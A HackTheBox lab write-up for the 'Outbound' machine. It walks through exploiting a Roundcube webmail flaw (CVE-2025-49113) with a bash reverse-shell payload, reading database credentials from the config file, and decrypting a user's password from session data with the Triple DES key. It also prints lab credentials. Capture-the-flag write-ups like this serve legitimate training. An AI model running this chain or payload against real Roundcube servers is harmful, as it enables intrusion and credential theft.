Kicking off my return to HackTheBox after a long break, I stumbled upon an intriguing new machine—Outbound. Ready to dust off my hacking skills, I jumped straight into action by quickly setting up the VPN connection:

sudo openvpn outbound.ovpn


i poked at the box with an Nmap scan:

```bash
nmap -sC -sV -oN scan.txt 10.10.11.77
```
Here's the result of the scan:
![namp](/outbound.png)

I discovered two open ports: 22 (SSH) and 80 (HTTP).

Visiting http://10.10.11.77 redirected me to mail.outbound.htb, so I added the following line to my /etc/hosts file:

```bash
10.10.11.77 mail.outbound.htb
```

After refreshing the page, I reached a Roundcube webmail login. Interestingly, the login credentials were provided directly on the page:
![machine](/htb.png)
After logging in, I quickly noticed the Roundcube version had a vulnerability: CVE-2025-49113.
(Quick reminder: Always check the software version for known CVEs!)

Next, I started a listener on my attacker machine:

```bash
nc -nlvp 4444
```
Then, on the target, I cloned the exploit repository and executed the exploit:

```bash
git clone https://github.com/fearsoff-org/CVE-2025-49113.git
cd CVE-2025-49113
php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "bash -c 'bash -i >& /dev/tcp/10.10.16.32/4444 0>&1'"
```
Now, with a shell as www-data amd you can see the exploit executed sucessfully 

![www-data](/htb2.png)
After this, I began looking around for important files and directories. Eventually, I came across the config directory located at:
```bash
 /var/www/html/roundcube/public_html/roundcube/config
``` 
Inside this directory, I found the config.inc.php file  

![Image](/config.png)

Now, since I had the database credentials clearly listed in the config.inc.php file, I could interact directly with the database. 
The credentials were as follows:

```bash
DB User: roundcube  
DB Pass: RCDBPass2025  
DB Name: roundcube  
```

inside the database, I found the tables containing users and sessions. Although the users table didn’t contain any passwords, the sessions table looked promising.
 I discovered these tables after running the SQL command SHOW TABLES;, which helped me quickly determine what to examine further.

```bash
mysql -u roundcube -pRCDBPass2025 roundcube
SHOW TABLES;
SELECT * FROM session;

```
The session data caught my attention because it was encoded in Base64, indicating that I'd need to decode it to find anything useful.

I proceeded to decode the session data, and upon decoding it, I obtained the following output:
![carbon](/carbon.png)

First, I decoded the session data using CyberChef.io, 

![decode](/decode.png)


carefully going through each entry one at a time. While decoding, I initially came across Tyler's credentials, which I already had, so I continued searching.

 Soon after, I discovered Jacob's session data, which contained an encrypted password—exactly what I was looking for.

To clearly view the decoded data, I first decoded the session using CyberChef’s Base64 decode operation with the "Y64" option.

The next step was decrypting Jacob's password. Previously, I had located an encryption key (rcmail-!24ByteDESkey*Str) in the config.inc.php file, which was crucial for this task.

After doing some additional research, I learned that Roundcube employs the Triple DES (DES-EDE3-CBC) encryption method.

Equipped with this information, I converted Jacob's Base64-encoded session data into Hex format and then successfully decrypted it with Triple DES using CyberChef.
and i got the access using password then

after this we found ssh login ssh jacob@10.10.11.77 and his password to ssh  gY4Wr3a1evp4 

![userflag](/userflag.png)

and we successfully found user flag here :)
